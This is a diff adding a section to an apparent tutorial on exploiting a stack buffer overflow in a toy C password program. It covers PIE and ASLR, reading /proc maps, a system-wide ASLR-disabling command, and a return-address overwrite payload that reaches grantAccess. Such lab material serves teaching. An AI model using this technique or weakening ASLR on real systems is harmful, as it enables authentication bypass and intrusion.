@@ -961,3 +961,301 @@ So this is the value which causes the segfault, not the garbage value we entered
 
 Now let's compile the binary without `-fno-pie` and `-no-pie` which will compile the binary into a Position Independent Executable which is a default in GCC. 
 
+```bash
+$ gcc  -fno-stack-protector -O0 -o vuln main
+
+$ objdump -d -M intel,mnemonic,no-att -j .text vuln
+
+vuln:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+00000000000010c0 <_start>:
+    10c0:	f3 0f 1e fa          	endbr64
+    10c4:	31 ed                	xor    ebp,ebp
+    10c6:	49 89 d1             	mov    r9,rdx
+    10c9:	5e                   	pop    rsi
+    10ca:	48 89 e2             	mov    rdx,rsp
+    10cd:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
+    10d1:	50                   	push   rax
+    10d2:	54                   	push   rsp
+    10d3:	45 31 c0             	xor    r8d,r8d
+    10d6:	31 c9                	xor    ecx,ecx
+    10d8:	48 8d 3d 9a 01 00 00 	lea    rdi,[rip+0x19a]        # 1279 <main>
+    10df:	ff 15 f3 2e 00 00    	call   QWORD PTR [rip+0x2ef3]        # 3fd8 <__libc_start_main@GLIBC_2.34>
+    10e5:	f4                   	hlt
+    10e6:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
+    10ed:	00 00 00
+    
+00000000000011a9 <grantAccess>:
+    11a9:	f3 0f 1e fa          	endbr64
+    11ad:	55                   	push   rbp
+    11ae:	48 89 e5             	mov    rbp,rsp
+    11b1:	48 8d 05 4c 0e 00 00 	lea    rax,[rip+0xe4c]        # 2004 <_IO_stdin_used+0x4>
+    11b8:	48 89 c7             	mov    rdi,rax
+    11bb:	e8 c0 fe ff ff       	call   1080 <puts@plt>
+    11c0:	90                   	nop
+    11c1:	5d                   	pop    rbp
+    11c2:	c3                   	ret
+
+00000000000011c3 <checkPassword>:
+    11c3:	f3 0f 1e fa          	endbr64
+    11c7:	55                   	push   rbp
+    11c8:	48 89 e5             	mov    rbp,rsp
+    11cb:	48 83 ec 10          	sub    rsp,0x10
+    11cf:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
+    11d3:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
+    11d7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
+    11db:	48 8d 15 31 0e 00 00 	lea    rdx,[rip+0xe31]        # 2013 <_IO_stdin_used+0x13>
+    11e2:	48 89 d6             	mov    rsi,rdx
+    11e5:	48 89 c7             	mov    rdi,rax
+    11e8:	e8 b3 fe ff ff       	call   10a0 <strcmp@plt>
+    11ed:	85 c0                	test   eax,eax
+    11ef:	75 0a                	jne    11fb <checkPassword+0x38>
+    11f1:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
+    11f5:	c7 00 01 00 00 00    	mov    DWORD PTR [rax],0x1
+    11fb:	90                   	nop
+    11fc:	c9                   	leave
+    11fd:	c3                   	ret
+
+00000000000011fe <AuthenticateUser>:
+    11fe:	f3 0f 1e fa          	endbr64
+    1202:	55                   	push   rbp
+    1203:	48 89 e5             	mov    rbp,rsp
+    1206:	48 83 ec 10          	sub    rsp,0x10
+    120a:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
+    1211:	48 8d 05 04 0e 00 00 	lea    rax,[rip+0xe04]        # 201c <_IO_stdin_used+0x1c>
+    1218:	48 89 c7             	mov    rdi,rax
+    121b:	b8 00 00 00 00       	mov    eax,0x0
+    1220:	e8 6b fe ff ff       	call   1090 <printf@plt>
+    1225:	48 8d 45 f8          	lea    rax,[rbp-0x8]
+    1229:	48 89 c6             	mov    rsi,rax
+    122c:	48 8d 05 fa 0d 00 00 	lea    rax,[rip+0xdfa]        # 202d <_IO_stdin_used+0x2d>
+    1233:	48 89 c7             	mov    rdi,rax
+    1236:	b8 00 00 00 00       	mov    eax,0x0
+    123b:	e8 70 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
+    1240:	48 8d 55 f4          	lea    rdx,[rbp-0xc]
+    1244:	48 8d 45 f8          	lea    rax,[rbp-0x8]
+    1248:	48 89 d6             	mov    rsi,rdx
+    124b:	48 89 c7             	mov    rdi,rax
+    124e:	e8 70 ff ff ff       	call   11c3 <checkPassword>
+    1253:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
+    1256:	83 f8 01             	cmp    eax,0x1
+    1259:	75 0c                	jne    1267 <AuthenticateUser+0x69>
+    125b:	b8 00 00 00 00       	mov    eax,0x0
+    1260:	e8 44 ff ff ff       	call   11a9 <grantAccess>
+    1265:	eb 0f                	jmp    1276 <AuthenticateUser+0x78>
+    1267:	48 8d 05 c2 0d 00 00 	lea    rax,[rip+0xdc2]        # 2030 <_IO_stdin_used+0x30>
+    126e:	48 89 c7             	mov    rdi,rax
+    1271:	e8 0a fe ff ff       	call   1080 <puts@plt>
+    1276:	90                   	nop
+    1277:	c9                   	leave
+    1278:	c3                   	ret
+
+0000000000001279 <main>:
+    1279:	f3 0f 1e fa          	endbr64
+    127d:	55                   	push   rbp
+    127e:	48 89 e5             	mov    rbp,rsp
+    1281:	b8 00 00 00 00       	mov    eax,0x0
+    1286:	e8 73 ff ff ff       	call   11fe <AuthenticateUser>
+    128b:	b8 00 00 00 00       	mov    eax,0x0
+    1290:	5d                   	pop    rbp
+    1291:	c3                   	ret
+```
+
+Few differences we can note between disassembly of PIE and non PIE binaries are
+
+**1. PIE uses relative addressing everywhere**
+
+The non-PIE version uses absolute addresses
+
+```
+40119e:  bf 04 20 40 00        mov    edi,0x402004
+```
+The PIE version uses RIP-relative addressing
+
+```
+ 11b1:	48 8d 05 4c 0e 00 00 	lea    rax,[rip+0xe4c] 
+```
+
+Position-Independent Executables are designed so the loader can place them at any base address in memory.
+To support this, the code must avoid using fixed, hard-coded absolute addresses. When the binary is relocated, the relative distances between instructions and sections stay the same, but their absolute virtual addresses change. Because of this relocation, any instruction containing a literal absolute address would become invalid, which is why PIE relies on RIP-relative addressing instead of fixed addresses.
+
+
+**2. Difference in Base Address**
+
+In non-PIE executables, the virtual addresses in the ELF file are fixed and assume the traditional ELF load base of 0x400000. This is why their .text and other segments appear at small, low canonical addresses (e.g., 0x401000). The loader places them exactly there because they are not relocatable.
+
+In contrast, PIE executables behave like shared libraries: they are compiled to be fully relocatable, and the loader chooses where to map them at runtime. When ASLR is enabled, the loader typically places PIE binaries much higher in the address space (e.g., 0x55xxxxxxx000 on Linux) so it can randomize the base address for security. That’s why PIE binaries show up at high addresses, while non-PIE binaries always sit near 0x400000.
+
+ASLR has no effect on non PIE executables. For PIE executables, when ASLR is disabled, the base address will always be `0x555555554000`, when ASLR is enabled, it will be a random address. 
+
+##### Process Maps
+
+A process map (also called memory map, address space map, or proc map) is a view of how a running process’s virtual memory is laid out.
+It shows which memory regions exist, where they are located, how large they are, what permissions they have, and what each region belongs to (code, stack, heap, shared libraries, etc.).
+
+You typically view this in Linux using:
+
+```
+cat /proc/<pid>/maps
+```
+
+or inside gdb using:
+
+```
+info proc mappings
+```
+
+**What the Process Map Represents?**
+
+Every process runs inside its own virtual address space, which the OS divides into segments.
+The process map lists these segments, such as:
+
+**1. The Program Itself**
+
+These entries correspond to your binary:
+	•	`.text` (code)
+	•	`.rodata` (read-only data)
+	•	`.data` (initialized global data)
+	•	`.bss` (uninitialized global data)
+
+They are shown with `r-xp`, `r--p`, `rw-p` permissions depending on their use.
+
+**2. The Heap**
+
+A dynamically growing region used by:
+	•	malloc
+	•	new
+	•	dynamic data structures
+
+**3. Shared Libraries**
+
+Loaded `.so` files like:
+	•	libc
+	•	libpthread
+	•	ld-linux loader
+
+Each library has multiple mapped regions (code, data, etc.).
+
+4. The Stack
+
+One big region for the program’s main thread:
+
+Holds:
+	•	return addresses
+	•	local variables
+	•	saved registers
+	•	stack frames
+
+1. Memory-Mapped Files
+
+Any file mapped by mmap() (config files, JIT regions, etc.)
+Example:
+
+```
+/memfd:x/y (deleted)
+```
+
+6. Special Kernel Regions
+
+Such as:
+	•	[vdso]
+	•	[vvar]
+	•	[vsyscall]
+
+Used to optimize system calls and provide kernel data.
+
+Using this we can inspect the process's and figure out the base address, this works even if ASLR is enabled, but it means the attacker should have access to your computer. 
+
+We can disable ASLR system wide by 
+
+```bash
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+We can run the program and get its pid
+
+```bash
+$ ps aux | grep vuln
+sanketh    12839  0.0  0.0   2680  1380 pts/1    S+   16:19   0:00 /home/sanketh/Desktop/vuln
+```
+
+We can get its map using 
+
+```bash
+$ cat /proc/12839/maps
+555555554000-555555555000 r--p 00000000 08:01 48496671                   /home/sanketh/Desktop/vuln
+555555555000-555555556000 r-xp 00001000 08:01 48496671                   /home/sanketh/Desktop/vuln
+555555556000-555555557000 r--p 00002000 08:01 48496671                   /home/sanketh/Desktop/vuln
+555555557000-555555558000 r--p 00002000 08:01 48496671                   /home/sanketh/Desktop/vuln
+555555558000-555555559000 rw-p 00003000 08:01 48496671                   /home/sanketh/Desktop/vuln
+555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]
+7ffff7c00000-7ffff7c28000 r--p 00000000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+7ffff7c28000-7ffff7db0000 r-xp 00028000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+7ffff7db0000-7ffff7dff000 r--p 001b0000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+7ffff7dff000-7ffff7e03000 r--p 001fe000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+7ffff7e03000-7ffff7e05000 rw-p 00202000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+7ffff7e05000-7ffff7e12000 rw-p 00000000 00:00 0
+7ffff7fa6000-7ffff7fa9000 rw-p 00000000 00:00 0
+7ffff7fbd000-7ffff7fbf000 rw-p 00000000 00:00 0
+7ffff7fbf000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]
+7ffff7fc1000-7ffff7fc3000 r--p 00000000 00:00 0                          [vvar_vclock]
+7ffff7fc3000-7ffff7fc5000 r-xp 00000000 00:00 0                          [vdso]
+7ffff7fc5000-7ffff7fc6000 r--p 00000000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffff7fc6000-7ffff7ff1000 r-xp 00001000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffff7ff1000-7ffff7ffb000 r--p 0002c000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffff7ffb000-7ffff7ffd000 r--p 00036000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffff7ffd000-7ffff7fff000 rw-p 00038000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
+```
+
+This confirms what we were expecting, if ASLR is disabled, base address will be `0x555555554000`. Adding this to `grantAccess`'s address gives `0x5555555551a9`
+
+
+```bash
+$ printf 'AAAAAAAAAAAAAAAA\xa9\x51\x55\x55\x55\x55\x00\x00' | ./vuln
+Enter password: Authentication Failed
+Access Granted
+Segmentation fault (core dumped)
+```
+
+#### Position Independent Executable Without ASLR
+
+We can build the payload similarly when ASLR is enabled
+
+```bash
+$ cat /proc/13003/maps
+5af5bbc3d000-5af5bbc3e000 r--p 00000000 08:01 48496671                   /home/sanketh/Desktop/vuln
+5af5bbc3e000-5af5bbc3f000 r-xp 00001000 08:01 48496671                   /home/sanketh/Desktop/vuln
+5af5bbc3f000-5af5bbc40000 r--p 00002000 08:01 48496671                   /home/sanketh/Desktop/vuln
+5af5bbc40000-5af5bbc41000 r--p 00002000 08:01 48496671                   /home/sanketh/Desktop/vuln
+5af5bbc41000-5af5bbc42000 rw-p 00003000 08:01 48496671                   /home/sanketh/Desktop/vuln
+5af5cf6f7000-5af5cf718000 rw-p 00000000 00:00 0                          [heap]
+70f2a1e00000-70f2a1e28000 r--p 00000000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+70f2a1e28000-70f2a1fb0000 r-xp 00028000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+70f2a1fb0000-70f2a1fff000 r--p 001b0000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+70f2a1fff000-70f2a2003000 r--p 001fe000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+70f2a2003000-70f2a2005000 rw-p 00202000 08:01 78907426                   /usr/lib/x86_64-linux-gnu/libc.so.6
+70f2a2005000-70f2a2012000 rw-p 00000000 00:00 0
+70f2a2152000-70f2a2155000 rw-p 00000000 00:00 0
+70f2a2169000-70f2a216b000 rw-p 00000000 00:00 0
+70f2a216b000-70f2a216d000 r--p 00000000 00:00 0                          [vvar]
+70f2a216d000-70f2a216f000 r--p 00000000 00:00 0                          [vvar_vclock]
+70f2a216f000-70f2a2171000 r-xp 00000000 00:00 0                          [vdso]
+70f2a2171000-70f2a2172000 r--p 00000000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+70f2a2172000-70f2a219d000 r-xp 00001000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+70f2a219d000-70f2a21a7000 r--p 0002c000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+70f2a21a7000-70f2a21a9000 r--p 00036000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+70f2a21a9000-70f2a21ab000 rw-p 00038000 08:01 78906094                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+7ffffb176000-7ffffb197000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
+```
+
+The base address is `0x5af5bbc3d000` which is randomly generated. The address of `grantAccess` is `0x5af5bbc3e1a9`
+
+
+
+
